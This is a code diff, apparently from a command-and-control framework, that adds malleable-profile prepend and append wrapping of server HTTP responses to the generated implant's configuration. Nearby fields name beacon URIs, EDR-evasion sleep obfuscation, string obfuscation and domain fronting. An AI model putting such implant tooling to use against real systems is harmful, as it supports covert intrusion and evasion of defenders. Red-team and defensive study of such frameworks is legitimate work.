@@ -237,6 +237,15 @@ func NormalizeImplantConfig(cfg *ImplantConfig, dataDir string) MalleableProfile
 	profile := loadMalleableProfile(cfg.Profile, dataDir)
 	cfg.BeaconURI = profile.BeaconURI
 	cfg.Method = profile.Method
+	// Carry the malleable response wrapping (prepend/append) into the config
+	// blob so the agent can strip it on HTTP replies. Explicit per-build
+	// values win over the profile file.
+	if cfg.MalleablePrepend == "" {
+		cfg.MalleablePrepend = profile.Prepend
+	}
+	if cfg.MalleableAppend == "" {
+		cfg.MalleableAppend = profile.Append
+	}
 
 	if UsesManualProfileSettings(cfg.Profile) {
 		if cfg.Interval < 0 {
@@ -371,6 +380,8 @@ type MalleableProfile struct {
 	Headers     map[string]string `json:"headers"`
 	Sleep       int               `json:"sleep"`
 	Jitter      int               `json:"jitter"`
+	Prepend     string            `json:"prepend,omitempty"` // bytes prepended to server HTTP responses
+	Append      string            `json:"append,omitempty"`  // bytes appended to server HTTP responses
 }
 
 // ImplantConfig holds parameters injected into the generated agent (EXE or PS1).
@@ -400,6 +411,8 @@ type ImplantConfig struct {
 	RegSecretID   string // v3 per-implant registration secret id (compiled into the binary)
 	RegSecret     string // v3 per-implant registration secret, base64 (replaces BeaconKey in v3 builds)
 	ExpiryDate    string // Compile-time expiry date "YYYY-MM-DD" (empty = disabled)
+	MalleablePrepend string // bytes prepended to server HTTP responses (strip on parse)
+	MalleableAppend  string // bytes appended to server HTTP responses (strip on parse)
 	Evasion       bool   // Enable chunked sleep obfuscation (Windows EDR basics)
 	Obfuscate     bool   // Enable garble build-time obfuscation (string/literal hiding)
 	DomainFront   string // CDN front domain for domain fronting ("" = disabled)
